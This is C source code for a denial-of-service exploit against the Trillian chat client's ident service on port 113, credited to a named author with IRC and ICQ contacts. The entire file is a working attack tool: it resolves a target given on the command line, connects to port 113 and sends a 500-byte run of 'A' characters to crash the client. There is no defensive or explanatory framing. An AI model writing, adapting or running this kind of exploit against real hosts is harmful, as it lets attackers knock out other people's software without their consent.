/* Trillian-Ident.c
   Author: Lance Fitz-Herbert
   Contact: IRC: Phrizer, DALnet - #KORP
            ICQ: 23549284

   Exploits the Trillian Ident Flaw.
   Tested On Version .74 and .73
   Compiles with Borland 5.5
   This Example Will Just DoS The Trillian Client.

*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
char payload[500];
int main(int argc, char * argv[]) {
        int iret;
        struct hostent *host;
        SOCKET sockhandle;
        SOCKADDR_IN address;
        WSADATA wsdata;

        if (argc<2) {
                printf("\nTrillian Ident DoS\n");
                printf("----------------------\n");
                printf("Coded By Lance Fitz-Herbert (Phrizer, DALnet/#KORP)\n");
                printf("Tested On Version .74 and .73\n\n");
                printf("Usage: trillian-ident <address>");
                return 0;
        }

        WSAStartup(MAKEWORD(1,1),&wsdata);
        printf("Making Socket Now...\n");
        sockhandle = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);

        if (sockhandle == SOCKET_ERROR) {
                printf("Error Creating Socket\n");
                WSACleanup();
                return 1;
        }

        printf("Socket Created\n");

        address.sin_family = AF_INET;
        address.sin_port = htons(113);
        address.sin_addr.s_addr = inet_addr(argv[1]);


        if (address.sin_addr.s_addr == INADDR_NONE) {
                host = NULL;
                printf("Trying To Resolve Host\n");
                host = gethostbyname(argv[1]);
                if (host == NULL) {
                        printf("Uknown Host: %s\n",argv[1]);
                        WSACleanup();
                        return 1;
                }
                memcpy(&address.sin_addr, host->h_addr_list[0],host->h_length);
        }



        printf("Connecting To Server...\n");
        iret = connect(sockhandle, (struct sockaddr *) &address,        sizeof(address));

        if (iret == SOCKET_ERROR) {
                printf("Couldnt Connect\n");
                WSACleanup();
                return 1;
        }

        printf("Connected to %s!\nSending Payload\n",argv[1]);
        memset(payload,'A',500);
        send(sockhandle,payload,strlen(payload),0);
        Sleep(100);
        WSACleanup();
        return 0;
}

